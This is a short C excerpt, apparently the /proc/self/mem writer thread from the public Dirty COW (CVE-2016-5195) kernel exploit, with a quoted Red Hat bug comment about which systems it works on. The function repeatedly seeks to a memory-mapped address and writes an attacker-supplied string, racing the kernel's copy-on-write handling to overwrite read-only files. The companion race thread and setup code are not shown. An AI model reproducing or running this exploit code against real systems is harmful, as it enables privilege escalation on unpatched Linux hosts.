void *procselfmemThread(void *arg)
{
  char *str;
  str=(char*)arg;
/*
You have to write to /proc/self/mem :: https://bugzilla.redhat.com/show_bug.cgi?id=1384344#c16
>  The in the wild exploit we are aware of doesn't work on Red Hat
>  Enterprise Linux 5 and 6 out of the box because on one side of
>  the race it writes to /proc/self/mem, but /proc/self/mem is not
>  writable on Red Hat Enterprise Linux 5 and 6.
*/
  int f=open("/proc/self/mem", O_RDWR);
  int i, c=0;
  for(i=0; i<100000000; i++) {
/*
You have to reset the file pointer to the memory position.
*/
    lseek(f, (uintptr_t) map, SEEK_SET);
    c += write(f, str, strlen(str));
  }
}
